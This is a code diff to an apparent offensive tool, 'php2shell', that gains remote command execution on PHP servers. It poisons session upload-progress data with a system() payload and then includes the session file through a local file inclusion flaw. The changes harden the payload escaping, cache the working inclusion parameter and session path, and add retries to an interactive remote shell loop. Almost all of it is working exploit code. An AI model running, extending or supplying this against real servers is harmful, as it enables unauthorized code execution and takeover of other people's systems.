@@ -315,6 +315,7 @@ def poison_payload(command: str) -> str:
     Session file format: upload_progress_<KEY>|a:5:{...}
     With KEY = 'x<?php ...?>', the file contains raw PHP which executes on LFI.
     """
+    command = command.replace("\\", "\\\\").replace("'", "\\'")
     # 'x' prefix keeps the variable name parser happy until the <?php tag
     return f"x<?php echo '{OUTPUT_DELIM}_start';system('{command}');echo '{OUTPUT_DELIM}_end';?>"
 
@@ -541,6 +542,10 @@ def _disturb_abort(host, port, path, use_tls, session_id, upload_key):
         return ("abort",)
     except Exception:
         return ("abort", "exc")
+
+
+# ─── LFI hit telemetry (session-wide fast path) ─────────────────────────────
+_LFI_TELEMETRY = {"param": None, "tmpl": None}
 
 
 # ─── LFI param auto-discovery ────────────────────────────────────────────────
@@ -860,18 +865,57 @@ def detect_session_path(host: str, port: int, path: str, use_tls: bool) -> Optio
     return None
 
 
-# ─── interactive shell ────────────────────────────────────────────────────────
+# ─── interactive shell (consistent, retrying) ────────────────────────────────
+
+def _ifire(host, port, path, use_tls, session_id, sess_file,
+           lfi_param, verify, cafile, timeout=4):
+    """One LFI GET against one poisoned session file. Returns output or None."""
+    scheme = "https" if use_tls else "http"
+    path_base = path.split("?")[0]
+    url = f"{scheme}://{host}:{port}{path_base}?{lfi_param}={urllib.parse.quote(sess_file)}"
+    req = urllib.request.Request(url)
+    req.add_header("Cookie", f"PHPSESSID={session_id}")
+    req.add_header("User-Agent", "Mozilla/5.0")
+    ctx = None
+    if use_tls and (not verify):
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+    opener = urllib.request.build_opener(
+        urllib.request.HTTPSHandler(context=ctx) if (use_tls and ctx)
+        else urllib.request.HTTPHandler())
+    try:
+        with opener.open(req, timeout=timeout) as r:
+            return extract_output(r.read().decode(errors="replace"))
+    except Exception:
+        return None
+
 
 def interactive_shell(host: str, port: int, path: str, use_tls: bool,
-                      lfi_param: str, known_sess_path: Optional[str],
+                      lfi_param: Optional[str], known_sess_path: Optional[str],
                       chunk_size: int, chunk_delay: float,
-                      verify: bool, cafile: Optional[str]) -> None:
-    print(cgreen("[+] Interactive shell — Ctrl+C to quit"))
+                      verify: bool, cafile: Optional[str],
+                      attempts: int = 3) -> None:
+    print("[+] Interactive shell -- Ctrl+C or 'exit' to quit")
     path_base = path.split("?")[0]
     scheme = "https" if use_tls else "http"
-    sess_templates = (
-        ([f"{known_sess_path}/sess_{{sid}}"] if known_sess_path else []) + SESSION_PATHS
-    )
+    sess_templates = []
+    if _LFI_TELEMETRY["tmpl"]:
+        sess_templates.append(_LFI_TELEMETRY["tmpl"])
+    if known_sess_path:
+        t = f"{known_sess_path}/sess_{{sid}}"
+        if t not in sess_templates:
+            sess_templates.append(t)
+    for t in SESSION_PATHS:
+        if t not in sess_templates:
+            sess_templates.append(t)
+
+    param_order = []
+    if _LFI_TELEMETRY["param"]:
+        param_order.append(_LFI_TELEMETRY["param"])
+    if lfi_param and lfi_param not in param_order:
+        param_order.append(lfi_param)
+
     while True:
         try:
             cmd = input("php2shell> ").strip()
@@ -881,41 +925,68 @@ def interactive_shell(host: str, port: int, path: str, use_tls: bool,
         if not cmd or cmd in ("exit", "quit"):
             return
 
-        session_id = uuid.uuid4().hex
-        upload_key = poison_payload(cmd)
-        stop_event = threading.Event()
-        upload_done = threading.Event()
+        got = None
+        for attempt in range(1, max(1, attempts) + 1):
+            session_id = uuid.uuid4().hex
+            upload_key = poison_payload(cmd)
+            stop_event = threading.Event()
 
-        def _up():
-            slow_upload(host, port, path, use_tls, session_id, upload_key,
-                        chunk_size=chunk_size, chunk_delay=chunk_delay,
-                        stop_event=stop_event, verify=verify, cafile=cafile)
-            upload_done.set()
+            def _up():
+                slow_upload(host, port, path, use_tls, session_id, upload_key,
+                            chunk_size=chunk_size, chunk_delay=chunk_delay,
+                            stop_event=stop_event, verify=verify, cafile=cafile)
 
-        threading.Thread(target=_up, daemon=True).start()
-        time.sleep(0.3)
+            up_thread = threading.Thread(target=_up, daemon=True)
+            up_thread.start()
+            time.sleep(0.25)
 
-        out = None
-        deadline = time.time() + 30  # max 30s per command
-        while out is None and time.time() < deadline:
-            for tmpl in sess_templates:
-                sess_file = tmpl.format(sid=session_id)
-                url = f"{scheme}://{host}:{port}{path_base}?{lfi_param}={urllib.parse.quote(sess_file)}"
-                req = urllib.request.Request(url)
-                req.add_header("Cookie", f"PHPSESSID={session_id}")
-                req.add_header("User-Agent", "Mozilla/5.0")
-                try:
-                    with urllib.request.urlopen(req, timeout=5) as r:
-                        out = extract_output(r.read().decode(errors="replace"))
-                        if out:
+            deadline = time.time() + 10
+            while got is None and time.time() < deadline:
+                # fast path first: telemetry / user param, known session path
+                fast_files = []
+                if _LFI_TELEMETRY["tmpl"]:
+                    fast_files.append((_LFI_TELEMETRY["param"] or lfi_param,
+                                       _LFI_TELEMETRY["tmpl"].format(sid=session_id)))
+                if lfi_param and known_sess_path:
+                    f = f"{known_sess_path}/sess_{session_id}"
+                    if f not in [x[1] for x in fast_files]:
+                        fast_files.append((lfi_param, f))
+                for p, f in fast_files:
+                    if not p:
+                        continue
+                    out = _ifire(host, port, path, use_tls, session_id,
+                                 f, p, verify, cafile)
+                    if out is not None:
+                        _LFI_TELEMETRY["param"] = p
+                        got = out
+                        break
+                if got is not None:
+                    break
+                for p in param_order:
+                    if not p:
+                        continue
+                    for tmpl in sess_templates:
+                        out = _ifire(host, port, path, use_tls, session_id,
+                                     tmpl.format(sid=session_id), p,
+                                     verify, cafile)
+                        if out is not None:
+                            _LFI_TELEMETRY.update({"param": p, "tmpl": tmpl})
+                            got = out
                             break
-                except Exception:
-                    pass
-            if not out:
-                time.sleep(0.05)
+                    if got is not None:
+                        break
+                if got is None:
+                    time.sleep(0.03)
 
-        stop_event.set()
-        print(cgreen(out.strip()) if out else cred("[!] no output"))
+            stop_event.set()
+            up_thread.join(timeout=6)
+            if got is not None:
+                break
+            else:
+                if attempt < attempts:
+                    print(f"    [Attempt {attempt}/{attempts}] window missed -- retrying")
+
+        print(cgreen(got.strip()) if got else cred("[!] no output"))
 
 
 # ─── detection / probe ───────────────────────────────────────────────────────
@@ -1020,6 +1091,8 @@ def try_lfi(host: str, port: int, path: str, use_tls: bool,
                     body = r.read().decode(errors="replace")
                     out = extract_output(body)
                     if out is not None:
+                        _LFI_TELEMETRY["param"] = param
+                        _LFI_TELEMETRY["tmpl"] = sess_tmpl
                         return out
             except Exception:
                 pass
